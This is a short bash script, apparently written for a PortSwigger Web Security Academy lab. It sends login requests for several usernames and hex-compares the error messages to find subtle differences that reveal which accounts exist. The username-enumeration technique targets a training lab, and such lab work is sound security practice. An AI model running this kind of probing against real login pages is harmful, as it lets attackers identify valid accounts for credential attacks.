#!/bin/bash

echo "Checking for invisible differences (spaces, etc.)..."
echo "=================================================="

# Save responses and compare hex
for user in carlos admin alessandro; do
    response=$(curl -s -X POST "https://0a0e004a04be7fa081da8aa70008003b.web-security-academy.net/login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: session=Zj5ZT2FoyIS2txq2JmIWYDW41JykgiqP" \
        -d "username=$user&password=test")
    
    # Extract just the error line and convert to hex
    error_line=$(echo "$response" | grep "Invalid username or password")
    hex=$(echo -n "$error_line" | od -An -tx1)
    
    echo "User: $user"
    echo "Error line: $error_line"
    echo "Hex: $hex"
    echo "Length: $(echo -n "$error_line" | wc -c)"
    echo ""
done